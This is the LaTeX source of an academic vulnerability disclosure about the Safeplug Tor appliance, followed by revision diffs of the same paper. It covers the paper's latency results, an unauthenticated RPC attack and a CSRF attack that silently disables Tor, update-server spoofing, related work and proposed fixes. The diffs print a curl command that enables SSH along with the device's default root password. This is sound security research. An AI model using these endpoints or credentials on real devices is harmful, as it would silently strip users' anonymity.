The latency of using the Safeplug with Firefox, Tor, and ad-blocking is comparable to that of using the Tor Browser Bundle.  For all three web pages, the Tor Browser Bundle had slightly lower latency; the Tor Browser Bundle blocks scripts, and for web pages such as \url{www.coca-cola.com}, this provides a significant latency decrease.  This, in conjunction with the fact that the Tor Browser Bundle is free and is issued directly from The Tor Project, shows a convincing argument to use the Tor Browser Bundle in place of the Safeplug.

\section{Implementing Attacks}
As we discovered during the software analysis, the Safeplug has a remote procedure call (RPC) capability.  This is a script called \verb!xspctrl! found in \verb!/opt/xce/html/svc! and it contains various options.  Particularly, functional calls to this script include enable and disable for all of the Safeplug settings, including Tor, ad block, and Tor relay.  None of them require any arguments in the POST string.

\begin{figure*}[htb]
\begin{center}
\includegraphics[width=.75\textwidth]{disabletor}
\caption{Disabling Tor as an insider attack.}
\label{disable}
\end{center}
\end{figure*}

\subsection{Insider Attack}
Since the RPC server does not perform any kind of validation or authentication on the settings strings, it would be easy for anyone inside the local network to send a command and change the settings, for example to disable Tor or adblocking.  All the attacker would need to know is the IP of the device.  It does not even require SSH or discovering the (publically available) root password, or the user's new root password if they have been well-informed and adept enough to change it.  Figure \ref{disable} shows an example of this attack.

This attacker could also be any kind of device on the local network, or the local gateway if it is compromised.  The NSA ``Spymall'' catalog leaked in December shows tools for compromising a number of different devices and home routers are traditionally insecure \cite{spymall}.  It is easy to imagine any malicious party, not just one with the resources of a government, (although governments might be some of the most interested parties in attacking a Tor proxy) compromising the gateway and using that access to make a disabling RPC call into the Safeplug.  This would occur silently from the perspective of a client unless they happen to check the Settings page for the Safeplug.  Instead, the client would continue browsing with a belief that they are protected by their use of the Tor network, while in fact any external adversary can track their traffic.

This seems like a fairly important vulnerability and requires action from Pogoplug to fix.  Since the purpose of these RPC operations is unclear without access to more of the source code, it is possible that they could be disabled entirely.  If not, perhaps there is some authentication protocol that could be implemented.  The challenge of such a protocol from a user's point of view is that valid access would be infrequent so giving a user a password to remember would be a poor experience.

\subsection{CSRF Attack}
An external website can also perform this attack by returning a correctly formatted POST string.  This executes the same functionality as the Insider Attack, but the attacker does not need to be on the local network or know the IP address of the Safeplug.  Instead, the attacker (who could be any malicious actor with access to a web server) can just send a POST request to every IP in the common ranges of local addresses in home networks, 192.168.0.0/24 and 192.168.1.0/24.  We implemented this attack with less than 30 lines of Javascript code (See Appendix A).  The following steps are necessary for the attack to be successful:

\begin{enumerate}
\item Set up a web page with the crafted Javascript code, which will send the POST request of the following format to all addresses in the common ranges: \url{http://<IP address>/svc/xspctrl/disableTor} (See Appendix \ref{App:AppendixA}).
\item Send the malicious link to a user in the targeted private network.
\item Once the user clicks the link and loads the malicious site, the correctly formatted POST request will be sent to every IP address in the ranges.  
\item Tor is disabled silently.  The user must check or refresh her settings page to learn that Tor is turned off.  
\end{enumerate}

This exploits the RPC server in the same manner that the Insider Attack does.  While this attack requires a greater amount of time because the local IP address of the Safeplug must be guessed via search, the number of private address spaces is small, and the space likely to be occupied by a Safeplug on a home network is even smaller.

The largest observed time to send requests to the 192.168.0.0/24 space was approximately 400 milliseconds; the entire attack costs approximately 800 milliseconds for sending request to both 192.168.0.0/24 and 192.168.1.0/24 ranges - even when the website was being loaded over Tor.  In the case of a private network in the range of 172.16.0.0/16, the attack took less than ~12 minutes (this generates script timeout warnings in most major browsers, which affects the timing of this attack).  This means that it would take a few hours to send requests to the full 172.16.0.0/12 range, which is commonly used in business networks.  The final private network space is 10.0.0.0/8 which is too large for an exhaustive search, but some simple optimization might make it feasible as well.  For example, using a GET request to get and parse the Safeplug settings page would allow the script to positively identify the safeplug and stop the search.  However, the 192.168.0.0/24 and 192.168.1.0/24 ranges are much more common in home networks; because Safeplug is geared towards home network use, in most cases the script will take less than a second, a trivial amount of time for the attacker to spend.

In addition to disabling Tor, the attacker can modify any other settings on the device.  This includes: enabling/disabling Tor, enabling/disabling ad-blocking, enabling/disabling the use of the device as a Tor relay node [note: this requires the user to do additional setup], enabling/disabling the use of the device as an exit node (if it is already a relay).  Lastly, the attacker can also modify the user's whitelist of sites that should not be routed through Tor.  This whitelist attack is particularly dangerous because the change is silent and much harder for the user to notice the addition of a single website to the whitelist than a global loss of Tor.  (Removal of a webpage from the whitelist is likely to cause usability problems and be more evident.)

\subsection{Gaining Access through SSH}
\label{sec:SSH}
    Safeplug runs an RPC server that allows the enabling of SSH access via HTTP. SSH instructions for Cloud Engine's other device (Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same \cite{ceadmin}:
%\begin{fileName}
%curl --data ``'' http://<IP-of-Safeplug>/svc/xspctrl/enableSSHD
%ssh root@<IP-of-Safeplug>
%password: ceadmin
%\end{fileName}

Obviously having a publically available root password means that SSH can be done effectively without authentication.  We tried the SSH procedure twice, once before the internet connection and activation, and once afterwards.  Before the activation and update procedure, SSH was not available.  The simple \verb!Hbplug! software on the box could not accept this RPC call.  However, once the box was updated and had lighttpd installed, the SSH procedure was available and we could download the contents of the root filesystem for analysis.

\section{Related Work}
To our knowledge, there has been no other study analyzing the security of Pogoplug's Safeplug device.  However there has been much prior research on the primary technology that the device uses: Tor.  Additionally, the security vulnerabilities that Safeplug attempts to secure users against have been previously studied in great detail; these include fingerprinting and cookies.

{\bf Tor.} Prior security evaluations of the Tor network reveal a myriad of potential vulnerabilities.  A significant area of research on Tor relates to diversity of autonomous systems (ASes).  Feamster and Dingledine argue that a user's anonymity may be compromised by using geographically diverse ASes; when analyzing both sides of an anonymous path, it is more likely the same AS will appear in both sides of a long path than in a short path~\cite{feamster}.  Murdoch and Zielinski also argue against AS diversity.  They state that AS diversity does not improve security because traffic is routed through ASes at Internet exchange points (IXPs); therefore, an IXP can observe traffic that passes through multiple ASes~\cite{murdoch2}.  There has also been proven traffic correlation attacks that are efficient on the Tor network~\cite{murdoch, overlier}.  Johnson, Wacek, Jansen, Sherr, and Syverson evaluated Tor's security against reasonably realistic adversaries and contribute metrics that model security over time.  They found that in a period of six months, 80\% of all users may be deanonymized by a reasonably realistic Tor-relay adversary.  Johnson et al. take into account how the Tor network evolves over time when evaluating Tor's security~\cite{tor2}.  While Safeplug does not introduce or modify how Tor is used, it routes all traffic through the Tor network; Safeplug is also vulnerable to the attacks found in prior research on Tor.

{\bf Fingerprinting.}  Website fingerprinting attacks as well as remote physical device fingerprinting attacks have shown they can identify users, even when specific defenses have been used in order to prevent these attacks. Previous research has shown that web page fingerprinting attacks are possible~\cite{dyer, herrmann, panchenko}.  Cai, Zhang, Joshi, and Johnson introduced both a web page and website fingerprinting attack that defeats many recently proposed defenses, including cover traffic and randomized pipeling.  They find that their attack is successful 83.7\% of the time when the defense is the use of Tor; the success rate decreases to 52.2\% when the defense is the use of Tor, randomized pipelining, padding packets to 1500 bytes, and adding cover traffic at a 1:1 ratio~\cite{fingerprint1}.  These results can be extended to the security of Safeplug.  Because Safeplug uses only Tor to anonymize users, it may be susceptible to this type of fingerprinting attack.

{\bf Cookies} There has been much policy and technology debate around the topic of third-party web tracking.  Mayer and Mitchell survey recent policy and technology stances on web tracking; while tracking allows for free web content and innovation, it compromises a user's privacy~\cite{commercial2}.  They discuss the existence and use of stateful tracking by using ``supercookies.''  While many companies use cookies, there has also been work in developing privacy-preserving third-party services, such as Privad, Adnostic, and RePriv~\cite{guha, toubiana, fredrikson}.

\section{Discussion}
\subsection{Engineering Fixes}
The most critical engineering fix is authentication in the POST calls to prevent the cross-site request forgery attack.  A typical example is a cookie and a hidden form field set in the Settings page the Safeplug hosts; the cookie must be returned by the browser when making the POST request to the RPC server \cite{csrfdef}.  Although someone doing a cross-site request forgery attack such as the one described above could get the cookie sent, because of the same-origin policy, the adversary would not be able to examine the contents of the cookie to determine what to put in the form field.

\subsection{Structural Problems}
However, there are much more significant structural problems with implementing a Tor connection via an HTTP proxy.  Several of the usability problems involve user awareness and vigilance.  For example, cookies and fingerprinting problems mean that users could still be tracked across websites, regardless of whether the ad-block functionality on the Safeplug is enabled.  This poses an unreasonable stress on users who must be aware of their browsing practices and does not bode well for the advertised security and anonymity.

One type of client that deserves special attention is a non-Android mobile phone user.  Although the Tor Project publishes an Android app called Orbot on the Android Market \cite{orbot} which is supported for Android versions 2.3 and later \cite{amorbot}, there are no official Tor apps for iPhones or other non-Android devices.  Safeplug provides proxy functionality and instructions for Safari on the iPhone; however, this would only work while the user is on that wifi network that the Safeplug routes through.  If any data is sent over the cellular network or another wifi network, then the security of Tor is lost.  Additionally, the user may have to disable the proxy whenever they move to a different network, and remember to re-enable it when they want to use Tor.  This is certainly not transparent usability.  Users who are truly concerned about anonymity online should eschew the Safeplug and purchase a device that supports the Tor Browser Bundle or other Tor Project software.

\subsection{Opportunities}
Despite all the structural problems, is there a market for a Torifying piece of hardware?  Given the security pitfalls in comparison to a piece of software such as the Tor browser bundle, there seems to be no reason for a user that can run the Tor browser bundle to purchase the Safeplug or any other device.  For mobile phones, the proxy problems with mobility contribute to an already high usability cost.  However, there are an emerging class of ``smart home'' devices which may connect to the internet.  It is possible that some of these devices can be configured to use an HTTP proxy or some other middle box to Torify their traffic to an external service provider.  For them, is the benefit of some anonymity via a Safeplug-like device worthwhile?  Since the data sent by these devices to the service provider likely contains lots of identifying information, the use of Tor probably only protects the user's location at the expense of connection time and load on the Tor network.  Since proxy configuration on such devices is likely to be difficult and the amount of information hidden is unlikely to be worth the effort, a Torifying box that functions as a proxy has questionable use in this space as well.

Ultimately, the structural concerns of the Safeplug ``Torifying proxy-in-a-box'' strategy indicate that this is not the correct method for security and anonymity online.  It is critical for Safeplug to correct their engineering errors, particularly the vulnerability to silent disabling of Tor in order to protect customers who have already made use of the device, but users who are truly concerned about safety and anonymity online should make use of technologies directly from the Tor Project.

% Note that IEEE does not put floats in the very first column - or typically
% anywhere on the first page for that matter. Also, in-text middle ("here")
% positioning is not used. Most IEEE journals/conferences use top floats
% exclusively. Note that, LaTeX2e, unlike IEEE journals/conferences, places
% footnotes above bottom floats. This can be corrected via the \fnbelowfloat
% command of the stfloats package.

% conference papers do not normally have an appendix

% use section* for acknowledgement
\section*{Acknowledgment}
We would like to express our gratitude to Ed Felten for helping us procure the Safeplugs and to Josh Kroll for donating a lot of time and his computer to the routing effort.  We also thank whoever left the very nice set of screwdrivers on our desks!

% trigger a \newpage just before the given reference
% number - used to balance the columns on the last page
% adjust value as needed - may need to be readjusted if
% the document is modified later
%\IEEEtriggeratref{8}
% The "triggered" command can be changed if desired:
%\IEEEtriggercmd{\enlargethispage{-5in}}

% references section

% can use a bibliography generated by BibTeX as a .bbl file
% BibTeX documentation can be easily obtained at:
% http://www.ctan.org/tex-archive/biblio/bibtex/contrib/doc/
% The IEEEtran BibTeX style support page is at:
% http://www.michaelshell.org/tex/ieeetran/bibtex/
%\bibliographystyle{IEEEtran}
% argument is your BibTeX string definitions and bibliography database(s)
%\bibliography{IEEEabrv,../bib/paper}
%
% <OR> manually copy in the resultant .bbl file
% set second argument of \begin to the number of references
% (used to reserve space for the reference number labels box)
\begin{thebibliography}{1}

\bibitem{spymall} Appelbaum et. al. ``Shopping for Spy Gear: Catalog Advertises 
NSA Toolbox'' \emph{Der Spiegel} 29 December 2013 \url{www.spiegel.de/internatio
nal/world/catalog-reveals-nsa-has-back-doors-for-numerous-devices-a-940994.html}

\bibitem{nsa} Arther, Charles.  ``NSA scandal: what data is being monitored and how does it work?'' \url{http://www.theguardian.com/world/2013/jun/07/nsa-prism-records-surveillance-questions}.

\bibitem{fingerprint1} Cai, Xiang, et al. ``Touching from a distance: Website fingerprinting attacks and defenses.'' \emph{Proceedings of the 2012 ACM conference on Computer and Communications Security (CCS)}, 2012.

\bibitem{ceadmin} Colleton, Lee. ``Fwd: SSH on Safeplug'' \emph{Tor-talk mailing list} 2 January 2014. \url{http://archives.seul.org/or/talk/Jan-2014/msg00003.html}

\bibitem{tor} Dingledine, Roger, et. al. ``Tor: The second-generation onion router.'' \emph{USENIX Security Symposium}, 2004.

\bibitem{dyer} Dyer, Kevin P., Coull, Scott E., Ristenpart, Thomas, and Shrimpton, Thomas.  ``Peek-a-boo, i still see you: Why efficient traffic analysis countermeasures fail.'' \emph{In Proceedings of the 33rd Annual IEEE Symposium on Security and Privacy}, 2012.

\bibitem{feamster} Feamster, Nick, and Dingledine, Roger.  ``Location Diversity in Anonymity Networks.''  \emph{In ACM Workshop on Privacy in the Electronic Society (WPES)}, 2004.

\bibitem{fredrikson} Fredrikson, M., and Livshits, B. ``Repriv: Re-envisioning in-browser privacy.'' \emph{In Proceedings of the 2011 IEEE Symposium on Security and Privacy}, May 2011.

\bibitem{guha} Guha, S., Cheng, B., and Francis, P. ``Privad: Practical privacy in online advertising.'' \emph{In Proceedings of the 2011 USENIX Symposium on Networked Systems Design and Implementation}, April 2011.

\bibitem{bittech} Halfacree, Gareth. ``Pogoplug launches Tor-powered Safeplug'' \emph{bit-tech.net} 25 November 2013, \url{http://www.bit-tech.net/news/hardware/2013/11/25/pogoplug-safeplug/1}.

\bibitem{herrmann} Herrmann, Dominik, Wendolsky, Rolf, and Federrath, Hannes.  ``Website fingerprinting: attacking popular privacy enhancing technologies with the multinomial naive-bayes classifier.'' \emph{In Proceedings of the 2009 ACM workshop on Cloud computing security}.

\bibitem{tor2} Johnson, Aaron, et al. ``Users get routed: Traffic correlation on Tor by realistic adversaries.'' \emph{Proceedings of the 2013 ACM SIGSAC conference on Computer \& Communications Security (CCS)}, 2013.

\bibitem{dropbear} Johnston, Matt. ``Dropbear SSH.'' \url{https://matt.ucc.asn.au/dropbear/dropbear.html}

\bibitem{fingerprint2} Kohno, Tadayoshi et. al. "Remote physical device fingerprinting." Dependable and Secure Computing, IEEE Transactions on 2.2 (2005): 93-108.

\bibitem{lighttpd} Lighttpd. \url{http://www.lighttpd.net}

\bibitem{marvellhw} Marvell, ``88F6190 and 88F6192 Integrated Controller Hardware Specifications'' 2 December 2008. \url{http://www.marvell.com//embedded-processors/kirkwood/assets/HW_88F619x_OpenSource.pdf}

\bibitem{marvell} Marvell, ``Marvell 88F6192 SoC with Sheeva Technology'' 2009. \url{http://www.marvell.com//embedded-processors/kirkwood/assets/88F6192-003_ver1.pdf}

\bibitem{marvell2} Marvell, ``Marvell Alaska 88E1116R'' 2007. \url{http://www.marvell.com/transceivers/assets/Marvell-Alaska-88E1116R-Single-Port-GbE.pdf}

\bibitem{fourthparty} Mayer, Jonathan. ``FourthParty'' \url{http://fourthparty.info}

\bibitem{commercial2} Mayer, Jonathan R., and John C. Mitchell. "Third-party web tracking: Policy and technology." \emph{IEEE Symposium on Security and Privacy (SP)}, 2012.

\bibitem{gigaom} Meyer, David. ``Say hello to Safeplug, Pogoplug’s \$49 Tor-in-a-box for anonymous surfing'', \emph{GigaOm}, 21 November 2013. \url{http://gigaom.com/2013/11/21/say-hello-to-safeplug-pogoplugs-49-tor-in-a-box-for-anonymous-surfing/}.

\bibitem{murdoch} Murdoch, S.J., Danezis, G.  ``Low-Cost Traffic Analysis of Tor.'' \emph{In IEEE Symposium on Security and Privacy (Oakland)}, 2005.

\bibitem{murdoch2} Murdoch, S.J. and Zielinski, P.  ``Sampled Traffic Analysis by Internet-Exchange-Level Adversaries.'' \emph{In Privacy Enhancing Technologies (PET)}, 2007.

\bibitem{overlier} Overlier, L. and Syverson, P.  ``Locating Hidden Servers.'' \emph{In IEEE Symposium on Security and Privacy (Oakland)}, 2006.

\bibitem{panchenko} Panchenko, Andriy, Niessen, Lukas, Zinnen, Andreas, and Engel, Thomas.  ``Website fingerprinting in onion routing based anonymization networks.'' \emph{In Proceedings of the 10th Workshop on Privacy in the Electronic Society}, 2011.

\bibitem{pano} Panopticlick. \url{https://panopticlick.eff.org/}.

\bibitem{safeplug} Pogoplug. ``Safeplug'', \url{https://pogoplug.com/safeplug}.

\bibitem{privoxy} Privoxy. \url{https://www.privoxy.org}

\bibitem{schneier} Schneier, Bruce. ``Tor Appliance.'' \emph{Schneier on Security}, 27 November 2013. \url{https://www.schneier.com/blog/archives/2013/11/tor_appliance.html}.

\bibitem{techreview} Simonite, Tom. ``Online Anonymity in a Box, for \$49'', \emph{MIT Technology Review}, 21 November 2013. \url{http://www.technologyreview.com/news/521676/online-anonymity-in-a-box-for-49/}.

\bibitem{wired} Solon, Olivia. ``Safeplug makes it super-easy to harness Tor\'s anonymity at home,'' \emph{Wired UK}, 22 November 2013. \url{http://www.wired.co.uk/news/archive/2013-11/22/safeplug-tor}.

\bibitem{tormailinglist} Tor Mailing List.  \url{https://lists.torproject.org/pipermail/tor-talk/2013-November/031199.html}.

\bibitem{orbot} ``Tor on Android.'' \emph{Tor Project.} Accessed February 2014. \url{https://torproject.org/docs/android.html.en}

\bibitem{torproject} The Tor Project.  \url{https://www.torproject.org/}.

\bibitem{amorbot} The Tor Project. ``Orbot: Proxy with Tor.'' \emph{Google Android Market}. Accessed 7 February 2014, \url{https://play.google.com/store/apps/details?id=org.torproject.android}

\bibitem{toubiana} Toubiana, V., Narayanan, A., Boneh, D., Nissenbaum, H., and Barocas, S. ``Adnostic: Privacy preserving targeted advertising.'' \emph{In Proceedings of the 2010 Network and Distributed System Security Symposium}, March 2010.

\bibitem{wireshark} Wireshark, \url{http://www.wireshark.org/}.

\bibitem{csrfdef} Zeller and Felten. ``Cross-Site Request Forgeries: Exploitation and Prevention.'' \emph{Princeton Technical Report}. 2008.

\end{thebibliography}

% that's all folks
\end{document}

### 2014-02-19 w2sp/report.tex
It compiles and shows all the figures, plus section on Spoofing the Update Server

--- 2014-02-18 w2sp/bare_conf.tex
@@
 %
+\usepackage{cite}
 %\usepackage{cite}
@@
 % *** SUBFIGURE PACKAGES ***
-\usepackage[tight,footnotesize]{subfig}
+%\usepackage[tight,footnotesize,caption=false]{subfig}
+\usepackage[caption=false]{subfig}
 % subfigure.sty was written by Steven Douglas Cochran. This package makes it
@@
 
+\usepackage{listings}
+
 % *** Do not adjust lengths that control margins, column widths, etc. ***
@@
 \begin{document}
+
+\lstset{basicstyle=\footnotesize}
+
 %
@@
 %Princeton, New Jersey 08540-5233\\
-%Email: aksimpso@princeton.edu}
+%Email: aksimpso@cs.princeton.edu}
 %\and
@@
 Anne Edmundson,
-Josh Kroll and,
+Josh Kroll, and
 Ed Felten}
@@
 
-\begin{figure*}[t]
+\begin{figure*}
 \begin{center}
@@
 
-%\begin{figure*}[htb]
-%\centering
-%\begin{subfigure}[b]{.3\textwidth}
-%  \includegraphics[width=\textwidth]{safeplug_listed_top}
-%  \caption{Top of the board inside the Safeplug device.}
-%  \label{fig:top}
-%\end{subfigure}%
-%\qquad
-%\begin{subfigure}[b]{.3\textwidth}
-%\includegraphics[width=\textwidth]{safeplug_listed_bottom}
-%\caption{Bottom of the board inside the Safeplug device.}
-%\label{fig:bottom}
-%\end{subfigure}
-%\caption{Safeplug circuit board after the teardown.}
-%\end{figure*}
+\begin{figure*}[!b]
+\centering
+\subfloat[][Top of the board inside the Safeplug device.]{
+  \includegraphics[width=.3\textwidth]{safeplug_listed_top}
+  \label{fig:top}
+}
+\qquad
+\subfloat[][Bottom of the Board inside the Safeplug device.]{
+  \includegraphics[width=.3\textwidth]{safeplug_listed_bottom}
+  \label{fig:bottom}
+}
+\caption{Safeplug circuit board after the teardown.}
+\end{figure*}
 
@@
 
-On the other hand, it describes the functionality of a Tor relay node in a much more technical manner.
-This description is shown in Figure~\ref{fig:relaydesc}.
+On the other hand, it describes the functionality of a Tor relay node in a much more technical manner:
+\begin{quotation}
+``Make the Tor network strong for everybody!
+Enabling Tor Relay allows your Safeplug to act as a relay point on the Tor network.
+The more Tor relays that join the Tor network, the faster and more robust Tor becomes, helping everybody be more secure online.
+\\ \\ NOTE: You must forward inbound traffic on port 9001 to [IP-of-Safeplug].
+\\ For help configuring your router, click here.''
+\cite{safeplug}
+\end{quotation}
+
 If the majority of users can only understand the simpler description, then they likely won't understand the description of a Tor relay node.
@@
 Then there would be a large increase in use of the Tor network, yet most of the users are not giving back to it.
-
-\begin{figure*}
-\begin{center}
-\includegraphics[width=\textwidth]{funnydesc.png}
-\caption{Description of Tor on Safeplug settings page.}
-\label{fig:funnydesc}
-\end{center}
-\end{figure*}
-
-\begin{figure*}[th]
-\begin{center}
-\includegraphics[width=\textwidth]{relaydesc.png}
-\caption{Description of a Tor relay on Safeplug settings page.}
-\label{fig:relaydesc}
-\end{center}
-\end{figure*}
 
@@
 It is interesting to note that the only platform options were: OSX, Windows, Android, and iOS.
-Figure~\ref{fig:proxyconfig} shows our configuration.
 
-\begin{figure*}[t]
-\begin{center}
-\includegraphics[width=.75\textwidth]{proxyconfig}
-\caption{Proxy Configuration.}
-\label{fig:proxyconfig}
-\end{center}
-\end{figure*}
+%%TODO: A table for platform and browsers available?
 
@@
 
-\begin{figure*}[htb]
-\begin{center}
-\includegraphics[width=.75\textwidth]{settings}
+\begin{figure}[htb]
+  \centering
+  \includegraphics[width=.4\textwidth]{settings}
   \caption{Settings page.}
   \label{fig:settings}
-\end{center}
-\end{figure*}
+\end{figure}
 
@@
 \label{inetuse}
+
 Figure~\ref{fig:before} shows what a web page looks like before turning Tor and ad-blocking on, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
@@
 
-%\begin{figure}[htb]
-%\centering
-%\begin{subfigure}[b]{.4\textwidth}
-%\includegraphics[width=\textwidth]{before}
-%\caption{Web page before using Tor and ad-blocking.}
-%\label{fig:before}
-%\end{subfigure}%
-%\quad
-%\begin{subfigure}[b]{.4\textwidth}
-%\includegraphics[width=\textwidth]{after}
-%\caption{Web page after using Tor and ad-blocking.}
-%\label{fig:after}
-%\end{subfigure}
-%\end{figure}
+\begin{figure*}[htb]
+\centering
+\subfloat[][Web page before using Tor and ad-blocking.]{
+  \includegraphics[width=.4\textwidth]{before}
+  \label{fig:before}
+}
+\quad
+\subfloat[][Webpage after using Tor and ad-blocking.]{
+  \includegraphics[width=.4\textwidth]{after}
+  \label{fig:after}
+}
+\end{figure*}
 
@@
 
-\begin{figure*}[htb]
-\begin{center}
+\begin{figure}
+  \centering
   \includegraphics[width=0.5\textwidth]{funnygoogle}
@@
   \label{fig:funnygoogle}
-\end{center}
-\end{figure*}
+\end{figure}
 
@@
 
-\begin{figure*}[htb]
-\begin{center}
+\begin{figure*}
+  \centering
   \includegraphics[width=0.7\textwidth]{latency2}
@@
   \label{fig:latency2}
-\end{center}
 \end{figure*}
@@
 
-\begin{figure*}[htb]
-\begin{center}
+\begin{figure*}
+  \centering
   \includegraphics[width=.75\textwidth]{disabletor}
@@
   \label{disable}
-\end{center}
 \end{figure*}
@@
 Instead, the attacker (who could be any malicious actor with access to a web server) can just send a POST request to every IP in the common ranges of local addresses in home networks, 192.168.0.0/24 and 192.168.1.0/24.
-We implemented this attack with less than 30 lines of Javascript code (See Appendix A).
+We implemented this attack with less than 20 lines of Javascript code.
 The following steps are necessary for the attack to be successful:
@@
 \begin{enumerate}
-\item Set up a web page with the crafted Javascript code, which will send the POST request of the following format to all addresses in the common ranges: \url{http://<IP address>/svc/xspctrl/disableTor} (See Appendix \ref{App:AppendixA}).
+\item Set up a web page with the crafted Javascript code, which will send the POST request of the following format to all addresses in the common ranges: \url{http://<IP address>/svc/xspctrl/disableTor}.
 \item Send the malicious link to a user in the targeted private network.
@@
 SSH instructions for Cloud Engine's other device (Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same \cite{ceadmin}:
-%\begin{fileName}
-%curl --data ``'' http://<IP-of-Safeplug>/svc/xspctrl/enableSSHD
-%ssh root@<IP-of-Safeplug>
-%password: ceadmin
-%\end{fileName}
+\begin{lstlisting}
+curl --data ``'' http://<IP>/svc/xspctrl/enableSSHD
+ssh root@<IP-of-Safeplug>
+password: ceadmin
+\end{lstlisting}
 
@@
 However, once the box was updated and had lighttpd installed, the SSH procedure was available and we could download the contents of the root filesystem for analysis.
+
+\subsection{Spoofing the Update Server}
+A more dangerous class of vulnerabilities comes from the fact that the update process happens over insecure TCP rather than any kind of encrypted process.
+During our network analysis of the activation process, we discovered that the update script is downloaded via TCP from an IP address provided by the pogoplug servers.
+This update script (run as root) then downloads the Safeplug's software (Tor, Privoxy, Lighttpd, and wget) and checks it against MD5 hashes, but it is not clear whether there is suitable verification of the update script itself.
+An adversary could use DNS spoofing or compromise the Pogoplug server in order to force users to download a malicious update script - for example, something that turns the Safeplug into a surveillance box while appearing to provide the correct functionality.
+Since the most efficient way to check this would be to verify the contents of the Safeplug box itself by SSHing in, and SSHing explicitly breaks the warranty, it is clear that any kind of mitigation to this attack would be beyond an average user.
+Because the activation occurs over TCP rather than anything more secure, an adversary who can spoof DNS replies to the user has a paved gateway into the Safeplug box.
+This turns a device that does not live up to expectations but is otherwise harmless into something that actively harms security on the network.
 
@@
 % conference papers do not normally have an appendix
-
-% use section* for acknowledgement
-\section*{Acknowledgment}
-We would like to express our gratitude to Ed Felten for helping us procure the Safeplugs and to Josh Kroll for donating a lot of time and his computer to the routing effort.
-We also thank whoever left the very nice set of screwdrivers on our desks!
 

### 2014-02-19 report/background.tex

--- 2014-02-17 report/intro.tex
@@
-\section{Introduction}
-\label{sec:intro}
-
-User privacy is becoming increasingly important as more Internet users realize how vulnerable they are to attackers and eavesdroppers.
-This has been exacerbated by the current news about the NSA's surveillance of the Internet~\cite{nsa}.
-Unfortunately, the average Internet user is not aware of how to protect themselves against malicious users.
+\section{Background}
+\label{sec:background}
 

### 2014-02-19 report/intro.tex

--- 2014-01-14 intro.tex
@@
 Unfortunately, the average Internet user is not aware of how to protect themselves against malicious users.
-
-{\bf Tor.} Among the more computer-savvy Internet users, Tor is gaining popularity for this reason.
-Tor is a service that provides anonymous communication as an onion router; it also makes a tradeoff between anonymity, usability, and efficiency~\cite{tor}.
-While Tor provides some measure of anonymity, the average Internet user does not know about it or how it works.
-
-{\bf Safeplug.} Safeplug is a product that launched in December of 2013 from the cloud storage company Pogoplug, that offers any user the option of using Tor without having to know about it or how it works.
-It allows users to browse the web with “complete security and anonymity” for the cheap price of \$49 \cite{safeplug}.
-Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user’s router and the internet \cite{wired}.
-Pogoplug’s marketing pitch centers around the protection of user’s IP addresses by using Tor \cite{safeplug,bittech}.

### 2014-02-20 w2sp/report.tex
added new image
Version table and software writing

@@
 \subfloat[][Bottom of the Board inside the Safeplug device.]{
-  \includegraphics[width=.3\textwidth]{safeplug_listed_bottom}
+  \includegraphics[width=.3\textwidth]{safeplug_hardware_new}
   \label{fig:bottom}
@@
 
-\subsection{Terms of Service}
+\subsection{Information Prior to Using the Device: Terms of Service}
 \label{tos}
@@
 \subsection{Tor Relay Node Option}
+\label{port9001}
 One of Safeplug's configurations is the use of the device as a Tor relay node in the Tor network.  When the device is initially setup, the default setting is to not use it as a relay node.
@@
 \subsection{Software on the Safeplug}
+
+\begin{center}
+	\begin{tabular}{|c|c|c|}
+	\hline
+		Safeplug Software 	& Version 		& Date \\ \hline
+		Linux Kernel				& 2.6.31.8 	& 2009 \\ \hline
+		Lighttpd Web Server & 1.4.33			& 2013 \\ \hline
+		Privoxy Proxy				& 3.0.21			& 2013 \\ \hline
+		Tor Onion Routing		& 0.2.3.25		& 2012 \\ \hline
+		Dropbear sshd				& v0.52			& 2008 \\ \hline
+	\end{tabular}
+\end{center}
+
+The Safeplug runs version 2.6.31.8 of Arch Linux on an ARM architecture, which was produced at the end of 2009 and installed on 23 August 2011.
+Unsurprising for its age, there are a number of network vulnerabilities for this version of the kernel - most of which seem to produce denial of service attacks if an adversary sends a particularly formed packet \cite{kernelcve}.
+This is the same version of Linux that runs on Version 4 of PogoPlug's Mobile platform \cite{archforum}.
+
 The software installed by the activation process on the Safeplug (it is not on the box prior to the activation) is in \verb!/opt/xce!
@@
 while being] designed and optimized for high perfomance environments'' \cite{lighttpd}.
+The version of lighttpd on the box is only one version away from being up to date, 1.4.33 which was released on 27 September 2013.
+The current version of lighttpd, which has a number of security fixes, was released on 20 January 2014, after the Safeplug was purchased.
+However, checking for an update from the Safeplug does not lead to any updated software installation, one of many cases of inattention to detail.
+
 Privoxy is a ``non-caching web proxy with advanced filtering capabilities for enhancing privacy, modifying webpage data and HTTP headers, controlling access, and removing ads and other obnoxious Internet junk'' and it specifically advertises its ``flexible configuration'' \cite{privoxy}.
 Privoxy is also open source.
-All three pieces of software appear to have default configuration files.
-The fourth piece of software discovered on the device, which does not seem to be installed during the activation process is the Dropbear SSH server and client, used to support SSH access to the device \cite{dropbear}.
+The version on the device is 3.0.21, which is the most recent release.
+
+The version of Tor is v0.2.3.25 which is from November 2012.
+The current stable version of Tor is v0.2.4.20 from December 2013.
+Unlike Lighttpd and Privoxy, the Safeplug does not contain the most up-to-date version of Tor from when it was released.
+
+The fourth piece of software discovered on the device, which is not installed during the activation process and is in \verb!/usr/sbin!
+is the Dropbear SSH server and client, used to support SSH access to the device \cite{dropbear}.
 The Safeplug uses its own configuration files to determine how these pieces of software are set up and used.
+The version of Dropbear on the Safeplug is v0.52 from 2008, which is extremely out of date.
+Given the different location and installation methods, it seems likely that this was from the older Pogoplug device and is not designed to be updated in the same manner as the rest of the Safeplug software.
+
+\subsection{Networking}
+The lighttpd, Privoxy and Dropbear software give some indication of the networking services on the device.
+We used \texttt{nmap} to scan the ports.
+Before the activation of the Safeplug, only ports 80 and port 3333 are open.
+After the activation, without the use of Tor turned on, ports 22 for SSH, port 80 for settings access and port 8080 for http-proxy are open.
+When Tor is turned on as a relay, port 9001 tor-orport is opened as well.
+This corresponds with the note on the settings page about Tor relays discussed in Section \ref{port9001} above.
 
@@
 \begin{figure}[htb]
-  \centering
+  \begin{center}
   \includegraphics[width=.4\textwidth]{settings}
@@
   \label{fig:settings}
+	\end{center}
 \end{figure}
@@
 
-\begin{figure*}[htb]
+\begin{figure*}[!b]
 \centering
